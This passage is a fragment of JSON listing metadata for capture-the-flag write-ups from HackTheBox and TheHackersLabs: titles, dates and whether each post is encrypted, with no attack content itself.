Era","date":"2025-07-29","isEncrypted":true,"year":"2025","month":"07","day":"29"},{"id":"HackTheBoxSeason7-Cypher","title":"HackTheBox - Season7 - Cypher","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"07","day":"29"},{"id":"TheHackersLabsCyberGuard","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","isEncrypted":false,"year":"2025","month":"07","day":"28"},{"id":"TheHackersLabsPacharán","title":"TheHackersLabs - Pacharán","date":"2025-07-27","isEncrypted":false,"year":"2025","month":"07","day":"27"},{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"}]},"__N_SSG":true}